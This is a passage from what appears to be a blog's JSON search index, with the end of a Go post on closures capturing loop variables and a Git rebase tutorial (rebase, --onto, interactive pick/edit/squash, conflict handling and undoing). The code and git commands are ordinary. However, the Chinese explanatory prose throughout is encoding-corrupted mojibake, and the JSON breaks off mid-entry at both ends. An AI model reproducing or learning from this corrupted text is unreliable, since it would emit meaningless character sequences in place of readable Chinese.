            \n    s := []string{\"a\", \"b\", \"c\"}                             \n    for _, v := range s { \n        go func() {\n            fmt.Println(v)\n        }()                 \n    }                                                                             \n}\n```\n\næ”¹è¿›:\n\n```\nfunc main() {                \n    s := []string{\"a\", \"b\", \"c\"}                             \n    for _, v := range s { \n        go func(v string) {\n            fmt.Println(v)\n        }(v)      \n    }                                                                            \n}\n```\n\n<!-- more -->\n\n## å¾ªç¯å†…é—­åŒ…å‡½æ•°åˆ—è¡¨\n\n```\nfunc test() []func() {\n    var s []func()\n\n    for i := 0; i < 3; i++ {\n        s = append(s, func() {  \n            fmt.Println(&i, i)\n        })\n    }\n\n    return s    \n}\nfunc main() {\n    for _, f := range test() { \n        f()   \n    }\n}\n```\n\næ”¹è¿›:\n\n```\nfunc test() []func() {\n    var s []func()\n    \n    for i := 0; i < 3; i++ {\n        x := i                 \n        s = append(s, func() {\n            fmt.Println(&x, x)\n        })\n    }\n\n    return s\n}\nfunc main() {\n    for _, f := range test() {\n        f()\n    }\n}\n```\n\n\n\n### deferå»¶è¿Ÿè°ƒç”¨é—­åŒ…\n\n```\nfunc main() {\n    x, y := 1, 2\n\n    defer func(a int) { \n        fmt.Printf(\"x:%d,y:%d\\n\", a, y)  // y ä¸ºé—­åŒ…å¼•ç”¨\n    }(x) // å¤åˆ¶ x çš„å€¼\n\n    x += 100\n    y += 100\n    fmt.Println(x, y)\n}\n\n\n101 102\nx:1,y:102\n```\n","tags":["golang"],"categories":["golang"]},{"title":"ä¸ä¼šrebaseå°±ç­‰äºæ²¡å­¦è¿‡Git","url":"%2Fp%2Fb1718ace.html","content":"\n\n\n## ä»€ä¹ˆæ˜¯rebase \n\nRebaseå¯¹äºå¾ˆå¤šäººæ¥è¯´æ˜¯ä¸€ä¸ªå¾ˆæŠ½è±¡çš„æ¦‚å¿µï¼Œä¹Ÿå› æ­¤å®ƒçš„å­¦ä¹ é—¨æ§›å°±åœ¨äºå¦‚ä½•äº†è§£è¿™ä¸ªæŠ½è±¡çš„æ¦‚å¿µã€‚å¯¹äºrebaseÂ æ¯”è¾ƒæ°å½“çš„æ¯”å–»åº”è¯¥æ˜¯ã€Œç§»èŠ±æ¥æœ¨ã€ï¼Œç®€å•æ¥è®²æŠŠä½ çš„åˆ†æ”¯æ¥åˆ°åˆ«çš„åˆ†æ”¯ä¸Šï¼Œç¨åæˆ‘ä»¬ç”¨å‡ ä¸ªå›¾æ¥ç¤ºèŒƒmergeä¸rebaseÂ çš„å·®å¼‚ã€‚\n\n\n\näº†è§£rebaseä¹‹å‰ï¼Œæˆ‘ä»¬å¿…é¡»äº†è§£ä»€ä¹ˆæ˜¯baseã€‚å¯¹Gitçš„ä½¿ç”¨è€…è€Œè¨€ï¼Œåœ¨åˆ†æ”¯ä¸­è¿›è¡Œå¼€å‘æ´»åŠ¨æ˜¯ç¨€æ¾å¹³å¸¸çš„äº‹æƒ…ï¼Œä¹Ÿå› æ­¤åœ¨åˆå¹¶ç®¡ç†åˆ†æ”¯æ—¶ï¼Œä¹Ÿå°±éœ€è¦äº†è§£åˆ†æ”¯æ˜¯åœ¨å“ªä¸ªæ—¶é—´ç‚¹å“ªä¸ªæäº¤ç‚¹åˆ†å‡ºæ¥çš„æ—æ”¯ï¼Œè€Œé•¿å‡ºæ—æ”¯æ¥çš„æäº¤ç‚¹ï¼Œå¯¹äºæ—æ”¯æ¥è¯´å°±æ˜¯base commitï¼Œä¹Ÿå°±æ˜¯baseã€‚æ‰€ä»¥ç®€å•æ¥è¯´ï¼Œrebaseå…¶å®å°±æ˜¯æ”¹å˜åˆ†æ”¯çš„baseçš„åŠŸèƒ½ã€‚\n\n \n\nä¸‹å›¾æ˜¯åœ¨mergeçš„æƒ…å†µä¼šäº§ç”Ÿçš„ç‰ˆæœ¬æ¼”è¿›çš„ç¤ºæ„å›¾ï¼Œå¯ä»¥çœ‹åˆ°åœ¨æ–°çš„åˆ†æ”¯ä¸­æ‰€åšçš„å˜æ›´ï¼Œåœ¨åˆå¹¶ä¹‹åï¼Œä¸€å¹¶æˆä¸ºä¸€ä¸ªæ–°çš„æäº¤(commit 6)ã€‚è€Œcommit 1å°±æ˜¯New Branchçš„baseã€‚\n\n![1](ä¸ä¼šrebaseå°±ç­‰äºæ²¡å­¦è¿‡Git/1.png)\n\n\n\n\n\n<!-- more -->\n\nè€Œä¸‹å›¾æ˜¯rebaseÂ çš„æƒ…å†µä¸‹ä¼šäº§ç”Ÿçš„ç‰ˆæœ¬æ¼”è¿›çš„ç¤ºæ„å›¾ã€‚æˆ‘ä»¬åŒæ ·æ˜¯åœ¨åˆ†æ”¯ä¸­è¿›è¡Œå¼€å‘çš„åŠ¨ä½œï¼Œä½†æ˜¯åœ¨rebaseæ—¶ï¼Œä¸mergeä¸åŒçš„æ˜¯ï¼ŒGitä¼šå°†åˆ†æ”¯ä¸Šæ‰€åšçš„å˜æ›´å…ˆæš‚å­˜èµ·æ¥ï¼Œæ¥ç€æŠŠnewbaseÂ (æˆ–ç§°æ–°åŸºå‡†ç‚¹)åˆå¹¶è¿›æ¥ï¼Œæœ€åç›´æ¥å°†åˆšåˆšæš‚å­˜èµ·æ¥çš„å˜æ›´åœ¨åˆ†æ”¯ä¸Šé‡æ¼”ï¼Œè¿™è¾¹ç”¨ã€Œé‡æ¼”ã€è¿™ä¸ªå­—çœ¼æ˜¯è¡¨ç¤ºã€Œ**rebaseä¸æ˜¯å°†æäº¤(commit)å¤åˆ¶åˆ°åˆ†æ”¯ä¸Šï¼Œè€Œæ˜¯å°†æ•´ä¸ªå˜æ›´è¿‡ç¨‹ä¸€ä¸ªä¸€ä¸ªé‡æ–°å¥—ç”¨åˆ°åˆ†æ”¯ä¸Š**ã€ ï¼Œä¹Ÿå°±å› ä¸ºå¦‚æ­¤commit 2'ä¸commit 3'ï¼Œæ‰ä¼šæœ‰å¦å¤–çš„'ç¬¦å·è¡¨ç¤ºä¸åŸæœ¬çš„commit 2Â ,Â commit 3ä¸åŒï¼Œè¿™ç‚¹å¯ä»¥ä»commitçš„SHA1å‡‘å€¼ä¸åŒçœ‹å‡ºæ¥ï¼Œè™½ç„¶å˜æ›´çš„å†…å®¹ç›¸åŒï¼Œä½†æ˜¯commitç¼–å·æ˜¯ä¸åŒçš„ã€‚æœ¬æ–‡ä¼šåœ¨ç¨ååˆ©ç”¨èŒƒä¾‹æ¼”ç¤ºä¸€éã€‚\n\n![1](ä¸ä¼šrebaseå°±ç­‰äºæ²¡å­¦è¿‡Git/2.png)\n\nä¹Ÿå°±å› ä¸ºå¦‚æ­¤ï¼Œæ‰€ä»¥rebaseçš„è¡Œä¸ºå°±å¾ˆåƒã€Œç§»èŠ±æ¥æœ¨ã€ï¼Œä»¥ä¸Šå›¾æ¥è¯´ï¼Œå°±æ˜¯æŠŠNew Branchçš„å˜æ›´æ•´ä¸ªæ¥åˆ°Masterä¸Šã€‚è¿™æ ·çš„å¥½å¤„å°±æ˜¯ commit æ›´åƒä¸€æ¡ç›´çº¿,æ›´ä¼˜é›….\n\n \n\n\n\n## Rebase -åŸºç¡€ç”¨æ³•\n\nä»¥ä¸‹æˆ‘ä»¬ç”¨ä¸€ä¸ªæƒ…å¢ƒç¤ºèŒƒrebaseçš„ã€ŒåŸºç¡€ç”¨æ³•ã€ï¼š\n\n> ä½ æ˜¯ä¸€ä½team leaderï¼Œä½ çš„å…¶ä¸­ä¸€é¡¹èŒåŠ¡å°±æ˜¯è´Ÿè´£è¿›è¡Œç¨‹å¼ç å®¡æŸ¥(code review)ï¼Œå¹¶ä¸”å°†ä¸åŒç¨‹å¼åˆ†æ”¯è¿›è¡Œåˆå¹¶ç®¡ç†ã€‚\n>\n> ç°åœ¨æœ‰2ä½ç¨‹å¼è®¾è®¡å¸ˆä»¥developåˆ†æ”¯ä¸ºåŸºç¡€ï¼Œåˆ†åˆ«å¼€äº†æ–°çš„åˆ†æ”¯feature-aä¸feature-bï¼Œä¹Ÿéƒ½å·²ç»å®Œå·¥äº†ã€‚ä½ å¸Œæœ›åˆ©ç”¨rebaseçš„æ–¹å¼å°†è¿™2ä¸ªåˆ†æ”¯å¹¶å…¥developä¸­ã€‚\n\n é¦–å…ˆï¼Œdevelopçš„æ—¥å¿—å¦‚ä¸‹æ‰€ç¤ºï¼š\n\n```\ncommit 38844ba14312c642dcd0f72baf031de0c50ad736\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:41:04 2014 +0800\n\n    add HelloWorld.c\n\ncommit 3908e6bc1007f12566fdb5a0fb43f4055560b880\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:40:42 2014 +0800\n\n    initial commit\n```\n\næ¥ç€ï¼Œfeature-açš„æ—¥å¿—å¦‚ä¸‹æ‰€ç¤º:\n\n```\ncommit 15bf9c8954633700211f5b9d246ae67d8135cf29\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:42:48 2014 +0800\n\n    add feature_a.c\n\ncommit 38844ba14312c642dcd0f72baf031de0c50ad736\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:41:04 2014 +0800\n\n    add HelloWorld.c\n\ncommit 3908e6bc1007f12566fdb5a0fb43f4055560b880\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:40:42 2014 +0800\n\n    initial commit\n```\n\næœ€åæ˜¯feature-bçš„æ—¥å¿—ï¼š\n\n```\ncommit e9d7a6f8b27bca86ef298911d84891b8a7efeada\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:45:37 2014 +0800\n\n    add #include <stdio.h>\n\ncommit eb6436b59b7a0624f3ec5e5469ac36b37b5211e7\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:43:55 2014 +0800\n\n    add feature_b.c\n\ncommit 38844ba14312c642dcd0f72baf031de0c50ad736\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:41:04 2014 +0800\n\n    add HelloWorld.c\n\ncommit 3908e6bc1007f12566fdb5a0fb43f4055560b880\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:40:42 2014 +0800\n\n    initial commit\n```\n\nå¯ä»¥çœ‹åˆ°feature-aä¸feature-båˆ†åˆ«æ¯”developå¤šå‡ºäº†1, 2ä¸ªæäº¤ã€‚\n\n\n\nèº«ä¸ºä¸€åä¸“ä¸šçš„team leaderï¼Œæˆ‘ä»¬æœ‰ç€è¶³å¤Ÿçš„ä¿¡å¿ƒï¼Œç›¸ä¿¡è¿™2ä¸ªåˆ†æ”¯è¿ä½œçš„å¾ˆå¥½ï¼Œå› æ­¤æˆ‘ä»¬ç”¨ä»¥ä¸‹æŒ‡ä»¤è¿›è¡Œrebaseã€‚\n\n```\n$ git checkout develop\n$\n$ git rebase feature-a\nFirst, rewinding head to replay your work on top of it...\nFast-forwarded develop to feature-a.\n$\n$ git rebase feature-b\nFirst, rewinding head to replay your work on top of it...\nApplying: add feature_a.c\n```\n\nåœ¨ä¸Šè¿°æŒ‡ä»¤ä¸­ï¼Œæˆ‘ä»¬å…ˆåˆ‡æ¢åˆ°developåˆ†æ”¯ä¸­ï¼Œæ¥ç€æˆ‘ä»¬å¾ˆå¿«çš„å°±åˆ©ç”¨æŒ‡ä»¤git rebase <newbase>åˆå¹¶äº†feature-aä¸feature-bã€‚æ­¤å¤–ï¼Œåœ¨ä¸Šè¿°çš„æŒ‡ä»¤æ‰§è¡Œç»“æœä¸­ï¼Œå¯ä»¥çœ‹åˆ°ä¸€è¡Œè®¯æ¯æ˜¾ç¤ºFast-forwarded develop to feature-aï¼Œå…¶ä¸­çš„Fast-forwardedæ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿ\n\n> Fast-forwardedæŒ‡çš„å°±æ˜¯å½“2ä¸ªåˆ†æ”¯çš„å¤´å°¾ç›¸æ¥æ—¶ï¼Œä»£è¡¨2è€…ä¹‹é—´ä¸ä¼šæœ‰conflict ï¼Œå› æ­¤åªè¦æ”¹HEADçš„æŒ‡å‘å°±èƒ½å¤Ÿè¿…é€Ÿåˆå¹¶äº†ã€‚ä»¥æœ¬æƒ…å¢ƒä¸ºä¾‹ï¼Œdevelopçš„æœ€åä¸€ä¸ªæäº¤æ­£å¥½æ˜¯feature-açš„å¤´ï¼Œæ‰€ä»¥è¿™ä¸¤è€…çš„rebaseé€‚ç”¨Fast-forwardedæ¨¡å¼ã€‚\n\næ¥ä¸‹æ¥ï¼Œå¯ä»¥ç”¨git logçœ‹çœ‹developçš„æ—¥å¿—ï¼Œæˆ‘ä»¬å¯ä»¥ä»æ—¥å¿—ä¸­å‘ç°feature-aä¸feature-bçš„commit IDéƒ½ä¸ä¸€æ ·äº†ã€‚\n\n```\n$ git log\ncommit 07ef0b8e0b1edd079fb8b69f6e6e215725b5aba4\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:42:48 2014 +0800\n\n    add feature_a.c\n\ncommit e9d7a6f8b27bca86ef298911d84891b8a7efeada\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:45:37 2014 +0800\n\n    add #include <stdio.h>\n\ncommit eb6436b59b7a0624f3ec5e5469ac36b37b5211e7\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:43:55 2014 +0800\n\n    add feature_b.c\n\ncommit 38844ba14312c642dcd0f72baf031de0c50ad736\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:41:04 2014 +0800\n\n    add HelloWorld.c\n\ncommit 3908e6bc1007f12566fdb5a0fb43f4055560b880\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:40:42 2014 +0800\n\n    initial commit\n```\n\nä»¥ä¸Šå°±æ˜¯æœ€ç®€å•çš„rebaseè¿‡ç¨‹ã€‚\n\nä½†æ˜¯åœ¨è¿™è¿‡ç¨‹ä¸­ï¼Œæœ‰äº›äººå¯èƒ½äº§ç”Ÿäº†å‡ ä¸ªç–‘é—®â€”â€”ã€Œä¸ºä»€ä¹ˆå…ˆrebase feature-aå†rebase feature-båï¼Œä¼šæ˜¯feature-açš„æ—¥å¿—åœ¨æœ€ä¸Šæ–¹å‘¢ï¼Ÿã€\n\nè¿™æ˜¯ç”±äºrebaseä¼šå…ˆæ‰¾å‡ºä¸newbaseä¹‹é—´æœ€è¿‘çš„ä¸€ä¸ªå…±åŒbaseï¼Œç„¶åå…ˆä¿ç•™HEADæ‰€åœ¨åˆ†æ”¯(ä¹Ÿå°±æ˜¯å½“å‰åˆ†æ”¯)ä»å…±åŒbaseå¼€å§‹çš„æ‰€æœ‰å˜æ›´ï¼Œæ¥ç€ä»å…±åŒbaseå¼€å§‹ï¼Œå°†newbaseçš„å˜æ›´é‡æ–°å¥—ç”¨åˆ°HEADçš„æ‰€åœ¨åˆ†æ”¯åï¼Œå†å°†æ–¹æ‰æ‰€ä¿ç•™çš„å½“å‰åˆ†æ”¯å˜æ›´ä¸€ä¸ªä¸€ä¸ªå¥—ç”¨è¿›æ¥ï¼Œä¹Ÿå› æ­¤feature-aä¼šæ˜¯æœ€åçš„ä¸€ä¸ªcommitã€‚\n\n\n\næˆ‘ä»¬ä¸€æ ·ä»¥å›¾ç¤ºè¿›è¡Œè¯´æ˜ã€‚ä¸‹å›¾**After rebase feature-a**æ˜¯rebase feature-aä¹‹åçš„æ ·å­ï¼Œå¯ä»¥çœ‹åˆ°rebase feature-aä¹‹ådevelopä¸feature-bçš„å…±åŒbaseæ˜¯commit 38844bï¼Œå› æ­¤å¦‚æœè¦å†rebase feature-bçš„è¯ï¼Œcommit 15bf9cä¼šå…ˆè¢«æš‚å­˜èµ·æ¥ï¼Œå…ˆè¿›è¡Œrebase feature-bä¹‹åï¼Œå†å°†åˆšåˆšæš‚å­˜çš„commit 38844bé‡æ¼”ä¸€æ¬¡ï¼Œæ‰€ä»¥åœ¨å›¾**After rebase feature-b**ä¸­feature-açš„commit IDå°±ä»338844bå˜æˆ07ef0bï¼Œè¿™å°±æ˜¯rebaseçš„è¿‡ç¨‹äº†ã€‚\n\n\n\n![1](ä¸ä¼šrebaseå°±ç­‰äºæ²¡å­¦è¿‡Git/3.png)\n\nAfter rebase feature-a\n\n\n\n\n\n![1](ä¸ä¼šrebaseå°±ç­‰äºæ²¡å­¦è¿‡Git/4.png)\n\nAfter rebase feature-b\n\n\n\n\n\né—®é¢˜åˆæ¥äº†ï¼Œåˆšåˆšå­¦çš„rebaseä¼šå°†æ•´ä¸ªåˆ†æ”¯éƒ½æ¥ä¸Šå»ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬ä¸éœ€è¦æ•´ä¸ªåˆ†æ”¯éƒ½æ¥ä¸Šå»ï¼Œåªè¦æ¥åˆ°åˆ†æ”¯ä¸Šçš„æŸä¸ªæäº¤çš„ç‚¹å³å¯ï¼Œè¿™ç§æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨rebase â€“ ontoè¿›è¡Œã€‚\n\nå‡è®¾åªéœ€è¦æ¥åˆ°feature-bçš„commit eb6436æ—¶ï¼Œå°±å¯ä»¥ç”¨ä»¥ä¸‹æŒ‡ä»¤è¿›è¡Œrebaseï¼š\n\n```\n$ git rebase feature-b --onto eb6436\n```\n\nåˆæˆ–è€…ï¼Œæƒ³è¦æŠŠæˆ‘ä»¬ç°åœ¨çš„åˆ†æ”¯æ•´ä¸ªæ¥åˆ°æŸä¸ªåˆ†æ”¯ç‚¹ä¸Šé¢æ—¶ï¼Œå¯ä»¥é€‰æ‹©å¦ä¸€ç§ç”¨æ³•ï¼š\n\n```\n$ git rebase --onto <new base-commit> <current base-commit>\n```\n\nä¾‹å¦‚ï¼Œæˆ‘ä»¬åœ¨feature-båˆ†æ”¯ä¸Šæ—¶ï¼Œæƒ³æŠŠæ•´ä¸ªåˆ†æ”¯æ¥åˆ°commit 3908e6 (initial commit)æ—¶ï¼Œå¯ä»¥è¾“å…¥ä»¥ä¸‹æŒ‡ä»¤ï¼š\n\n```\n$ git co feature-b #å…ˆåˆ‡æ¢åˆ°feature-b\n$ git rebase --onto 3908e6 38844b\n```\n\nä¸‹é¢2 å¼ å›¾å°±æ˜¯æ‰§è¡Œä¸Šè¿°æŒ‡ä»¤çš„å‰åå¯¹ç…§ã€‚\n\n![1](ä¸ä¼šrebaseå°±ç­‰äºæ²¡å­¦è¿‡Git/5.png)\n\nbefore rebase â€“onto 3908e6 38844b\n\n\n\n![1](ä¸ä¼šrebaseå°±ç­‰äºæ²¡å­¦è¿‡Git/6.png)\n\nafter rebase â€“onto 3908e6 38844b\n\n\n\n\n\n## Rebase -è¿›é˜¶äº’åŠ¨æ¨¡å¼\n\nRebaseçš„äº’åŠ¨æ¨¡å¼ååˆ†å¼ºå¤§ï¼Œå¯ä»¥å…è®¸æˆ‘ä»¬äº¤æ¢æäº¤çš„æ¬¡åºã€ä¿®æ”¹æäº¤å†…å®¹ã€åˆå¹¶æäº¤å†…å®¹ï¼Œç”šè‡³å°†ä¸€ä¸ªæäº¤æ‹†è§£æˆå¤šä¸ªæäº¤ã€‚\n\nè¦è¿›å…¥äº’åŠ¨æ¨¡å¼çš„åŸºæœ¬æŒ‡ä»¤å¦‚ä¸‹ï¼Œbase commitå¯ä»¥æ˜¯åˆ†æ”¯ä¸Šçš„ä»»æ„ä¸€ç‚¹ï¼š\n\n```\n$ git rebase -i <base commit>\n```\n\nä¾‹å¦‚ï¼Œæˆ‘ä»¬æƒ³åˆ©ç”¨äº’åŠ¨æ¨¡å¼å°†feature-bä¸Šçš„æäº¤åšä¸€äº›æ•´ç†æ—¶ï¼Œå°±å¯ä»¥ç”¨ä»¥ä¸‹æŒ‡ä»¤è¿›å…¥äº’åŠ¨æ¨¡å¼ï¼š\n\n```\n$ git rebase -i 38844b\n```\n\nä¸Šè¿°æŒ‡ä»¤çš„æ„æ€å°±æ˜¯æˆ‘ä»¬å¸Œæœ›å°†feature-bä»commit 38844bä¹‹åçš„æ‰€æœ‰æäº¤(`ä¸å«commit 38844b `)è¿›è¡Œæ•´ç†ã€‚\n\næ¥ç€å°±ä¼šå‡ºç°ç±»ä¼¼ä»¥ä¸‹çš„è®¯æ¯ï¼š\n\n```\npick 1011f14 add feature_b.c\npick d26076a add #include <stdio.h>\n\n# Rebase 38844ba..d26076a onto 38844ba\n#\n# Commands:\n# p, pick = use commit\n# r, reword = use commit, but edit the commit message\n# e, edit = use commit, but stop for amending\n# s, squash = use commit, but meld into previous commit\n# f, fixup = like \"squash\", but discard this commit's log message\n# x, exec = run command (the rest of the line) using shell\n#\n# These lines can be re-ordered; they are executed from top to bottom.\n#\n# If you remove a line here THAT COMMIT WILL BE LOST.\n#\n# However, if you remove everything, the rebase will be aborted.\n#\n# Note that empty commits are commented out\n```\n\nåœ¨è¿›ä¸€æ­¥æ“ä½œå‰ï¼Œæˆ‘ä»¬å¿…é¡»å¯¹è®¯æ¯ä¸Šçš„å‡ ä¸ªæŒ‡ä»¤(commands)è¿›è¡Œè¯´æ˜ï¼š\n\n| pick:   | ä¿ç•™æ­¤æäº¤                                                   |\n| ------- | ------------------------------------------------------------ |\n| reword: | ä¿®æ”¹æäº¤çš„è®¯æ¯(åªæ”¹æäº¤è®¯æ¯)                                 |\n| edit:   | ä¿ç•™æ­¤æäº¤ï¼Œä½†æ˜¯éœ€è¦åšä¸€äº›ä¿®æ”¹(ä¾‹å¦‚åœ¨ç¨‹å¼é‡Œé¢å¤šåŠ äº›æ³¨è§£)     |\n| squash: | ä¿ç•™æ­¤æäº¤ï¼Œä½†æ˜¯å°†ä¸Šé¢çš„æäº¤ä¸€å¹¶å¹¶å…¥æ­¤æäº¤ï¼Œæ­¤åŠ¨ä½œä¼šæ˜¾ç¤ºæäº¤è®¯æ¯ä¾›äººç¼–è¾‘ |\n| fixup:  | ä¸squashç›¸ä¼¼ï¼Œä½†æ˜¯æ­¤æäº¤çš„æäº¤è®¯æ¯ä¼šè¢«ä¸Šé¢çš„æäº¤è®¯æ¯å–ä»£     |\n| exec:   | æ‰§è¡ŒshellæŒ‡ä»¤ï¼Œä¾‹å¦‚**exec make test**è¿›è¡Œä¸€äº›æµ‹è¯•ï¼Œå¯ä»¥éšæ„ç©¿æ’åœ¨æäº¤ç‚¹ä¹‹é—´ |\n\n### å˜æ¢é¡ºåº\n\næ¥ä¸‹æ¥ï¼Œç®€å•ç¤ºèŒƒå˜æ¢æäº¤çš„é¡ºåºï¼Œæ­¤å¤„æˆ‘ä»¬æƒ³æŠŠæäº¤çš„é¡ºåºå˜æˆå…ˆcommit 1011f14å†æ¥æ‰æ˜¯commit d26076aï¼Œæˆ‘ä»¬åªè¦ç®€å•å°†ä¸Šè¿°çš„rebaseè®¯æ¯æ¢æˆå¦‚ä¸‹çš„è®¯æ¯ï¼Œä¹Ÿå°±æ˜¯ä¸¤è¡Œäº’æ¢å³å¯ï¼Œå°±èƒ½å¤Ÿå˜æ¢é¡ºåºäº†ï¼\n\n```\n# æ­¤å¤„è°ƒæ¢æ¬¡åºå³å¯\npick d26076a add #include <stdio.h>\npick 1011f14 add feature_b.c\n\n# Rebase 38844ba..d26076a onto 38844ba\n#\n# Commands:\n# p, pick = use commit\n# r, reword = use commit, but edit the commit message\n# e, edit = use commit, but stop for amending\n# s, squash = use commit, but meld into previous commit\n# f, fixup = like \"squash\", but discard this commit's log message\n# x, exec = run command (the rest of the line) using shell\n#\n# These lines can be re-ordered; they are executed from top to bottom.\n#\n# If you remove a line here THAT COMMIT WILL BE LOST.\n#\n# However, if you remove everything, the rebase will be aborted.\n#\n# Note that empty commits are commented out\n```\n\n### ä¿®æ”¹æäº¤å†…å®¹\n\næœ‰äº›æ—¶å€™ï¼Œæˆ‘ä»¬æäº¤ä¹‹åï¼Œä¸å…ä¼šæ³¨è§£å¿˜äº†åŠ æˆ–æ˜¯ç¨‹å¼å†…è¿˜æœ‰æµ‹è¯•çš„codeå¿˜è®°æ¸…æ‰ã€‚è¿™æ—¶å€™é™¤äº†ç”¨git reset â€“soft HEAD^ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥ç”¨rebaseç¼–è¾‘é‚£äº›éœ€è¦ä¿®æ­£çš„æäº¤ã€‚\n\nä¾‹å¦‚ï¼Œæˆ‘ä»¬å¸Œæœ›ç”¨rebaseåœ¨commit 1011f14ä¸­æ·»åŠ å‡ ä¸ªæäº¤ï¼Œå°±å¯ä»¥å°†pickæ”¹æˆeditè¿›å…¥ç¼–è¾‘çŠ¶æ€ã€‚\n\n```\npick 1011f14 add feature_b.c\nedit d26076a add #include <stdio.h>\n\n# Rebase 38844ba..d26076a onto 38844ba\n#\n# Commands:\n# p, pick = use commit\n# r, reword = use commit, but edit the commit message\n# e, edit = use commit, but stop for amending\n# s, squash = use commit, but meld into previous commit\n# f, fixup = like \"squash\", but discard this commit's log message\n# x, exec = run command (the rest of the line) using shell\n#\n# These lines can be re-ordered; they are executed from top to bottom.\n#\n# If you remove a line here THAT COMMIT WILL BE LOST.\n#\n# However, if you remove everything, the rebase will be aborted.\n#\n# Note that empty commits are commented out\n```\n\næ¥ä¸‹æ¥ï¼Œå¦‚æœç”¨git statuså°±å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ­£åœ¨rebaseçš„è®¯æ¯ï¼š\n\n```\n$ git status\nrebase in progress; onto 38844ba\nYou are currently editing a commit while rebasing branch 'Feature-B' on '38844ba'.\n  (use \"git commit --amend\" to amend the current commit)\n  (use \"git rebase --continue\" once you are satisfied with your changes)\n\nnothing to commit, working directory clean\n```\n\n**å¦‚æœä½ åªæ˜¯æƒ³ä¿®æ­£æäº¤è®¯æ¯**ï¼Œå°±å¯ä»¥ç”¨ä»¥ä¸‹æŒ‡ä»¤ï¼š\n\n```\n$ git commit --amend\n```\n\n**å¦‚æœä½ éœ€è¦å¤šå¢åŠ å‡ ä¸ªæäº¤ï¼Œç›´æ¥ç¼–è¾‘å§**ï¼Œæ¥ç€ç”¨git add <file> , git commit -m <message>ç­‰ä¸€èˆ¬æ“ä½œè¿›è¡Œã€‚æœ€åå†åˆ©ç”¨ä»¥ä¸‹æŒ‡ä»¤å®Œæˆrebaseï¼š\n\n```\n$ git rebase --continue\n```\n\n**åˆæˆ–è€…ï¼Œæˆ‘ä»¬ç°åœ¨ç¼–è¾‘çš„æäº¤å®åœ¨æ˜¯å¤ªå¤§äº†ï¼Œå¯èƒ½å¯¹ç¨‹å¼ç å®¡æŸ¥çš„äººé€ æˆå›°æ‰°ï¼Œä¾‹å¦‚åŒæ—¶ä¿®æ­£å¤ªå¤šä¸ªæ¡£æ¡ˆï¼Œæˆ‘ä»¬å¸Œæœ›æ‹†æˆæ¯”è¾ƒæ˜ç¡®çš„å¤šä¸ªæäº¤**ï¼Œå°±å¯ä»¥ç”¨ä»¥ä¸‹æŒ‡ä»¤å›åˆ°æœªæäº¤å‰çš„çŠ¶æ€ï¼š\n\n```\n$ git reset HEAD^\n```\n\nç„¶åå°±å¯ä»¥ç”¨git statusåˆ—å‡ºè¿™ä¸ªæäº¤ä¸­å˜æ›´äº†å¤šå°‘æ¡£æ¡ˆï¼Œç„¶åä¾ç…§éœ€æ±‚ä¸€ä¸ªä¸€ä¸ªç”¨git addåŠ è¿›å»åæäº¤ï¼Œå¤šæäº¤ä¸ªå‡ æ¬¡ï¼Œå°±ç­‰äºæ˜¯å°†ä¸€ä¸ªæäº¤æ‹†æˆå¤šä¸ªæäº¤å•°ï¼ä¸è¿‡åˆ«å¿˜äº†ï¼Œè¦ç”¨ä»¥ä¸‹æŒ‡ä»¤ç»“æŸrebaseã€‚\n\n```\n$ git rebase --continue\n```\n\nä»¥ä¸Šå°±æ˜¯rebaseçš„å‡ ä¸ªç®€å•è¯´æ˜ä¸æ“ä½œã€‚\n\nè‡³äºsquash , fixupä»¥åŠexecå°±ç•™ç»™å„ä½å»ä½“éªŒäº†ï¼\n\n\n\n## Rebaseå‡ºç°é—®é¢˜æ—¶çš„å¤„ç†æ–¹æ³•\n\nRebaseä¸mergeä¸€æ ·éƒ½å¯èƒ½ä¼šäº§ç”Ÿ**conflict**ï¼Œè¿™æ—¶å€™é™¤äº†ä¿®æ­£**conflict**ä¹‹åå†ç”¨git add <file> , git rebase â€“continueå®Œæˆrebaseä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥ç”¨git rebase â€“abortç›´æ¥æ”¾å¼ƒrebaseã€‚\n\n```\ngit rebase (--continue | --abort | --skip)\n```\n\næ­¤å¤–ï¼Œå¯¹äºrebaseä½¿ç”¨ä¸æ…æ—¶ï¼Œæˆ‘ä»¬ä¼šå¸Œæœ›èƒ½å¤Ÿç›´æ¥å›å¤åˆ°rebaseä¹‹å‰çš„çŠ¶æ€ï¼Œä»¥ä¸‹å°±æ˜¯å‡ ä¸ªæŒ‡ä»¤å¯ä»¥ç”¨æ¥å›å¤åˆ°rebaseä¹‹å‰çš„çŠ¶æ€ã€‚å‚è€ƒè‡ª[StackOverFlow](http://stackoverflow.com/questions/134882/undoing-a-git-rebase)ã€‚\n\nå›å¤æ–¹æ³•1 ï¼š\n\n```\n# æœ€ç®€å•çš„ç”¨æ³•\n$ git reset --hard ORIG_HEAD\n```\n\nå›å¤æ–¹æ³•2 ï¼š\n\n```\n# rebase ä¹‹å‰å…ˆä¸Štag\n$ git tag BACKUP\n$ ... # rebase è¿‡ç¨‹\n$ ... # rebase è¿‡ç¨‹\n$ git reset --hard BACKUP # å¤±è´¥çš„è¯å¯ä»¥ç›´æ¥å›å¤åˆ°tag BACKUP\n```\n\nå›å¤æ–¹æ³•3 ï¼š\n\n```\n$ git reflog # 